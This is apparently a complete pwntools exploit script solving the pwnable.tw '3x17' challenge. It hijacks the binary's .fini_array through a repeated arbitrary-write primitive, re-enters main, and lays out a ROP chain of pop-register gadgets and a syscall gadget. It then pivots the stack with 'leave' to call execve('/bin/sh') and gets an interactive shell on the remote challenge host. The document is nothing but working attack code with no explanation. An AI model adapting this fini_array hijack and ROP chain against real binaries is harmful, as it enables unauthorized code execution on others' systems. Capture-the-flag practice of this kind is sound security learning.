from pwn import *

DEBUG = False

fini_array = 0x4B40F0
call_fini_array = 0x402960 
main = 0x401B6D

# ROP gadgets
leave = 0x401c4b
pop_rdi = 0x401696
pop_rsi = 0x406c30
pop_rdx = 0x446e35
pop_rax = 0x41e4af
syscall = 0x471db5
execve_syscall_num = 0x3b

gs = f"""
b *{pop_rax}
"""
if DEBUG:
    io = gdb.debug("./3x17", gdbscript=gs)
else:
    io = remote("chall.pwnable.tw", 10105)

def write(addr: int, data: bytes):
    io.sendafter(b'addr:', str(addr).encode())
    io.sendafter(b'data:', data)

write(fini_array, p64(call_fini_array) + p64(main))

write(fini_array + 8*3, p64(pop_rdi) + p64(fini_array + 8*10) + p64(pop_rsi))
write(fini_array + 8*6, p64(0) + p64(pop_rdx) + p64(0))
write(fini_array + 8*9, p64(syscall) + b'/bin/sh\x00')

write(fini_array, p64(leave) + p64(pop_rax) + p64(execve_syscall_num))

io.interactive();
